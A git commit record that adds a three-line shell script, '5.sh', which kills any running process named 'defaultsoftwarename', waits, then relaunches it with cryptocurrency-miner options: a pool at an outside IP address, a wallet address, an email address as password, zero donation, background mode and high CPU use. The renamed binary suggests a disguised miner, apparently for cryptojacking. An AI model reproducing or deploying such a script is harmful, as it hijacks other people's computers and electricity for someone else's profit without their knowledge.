33803f01e2d70db2b32ccd56cd1731d8a570578c
kasap777 <58770179+kasap777@users.noreply.github.com>
2020-02-01 00:09:31 +0200

    Add files via upload

---
+++ 5.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 147.135.170.165:3323 -u 44FocgX2kejXL16GidMNpuUNbAqnEZ89zh4gugRhHA5tTEsePGfwWarb4yZ6Nogph7SWDBoQCe4Y2Y3uLNfEfvf1KeVvoQo --pass=x:kutya7713@gmail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=87 --av=1
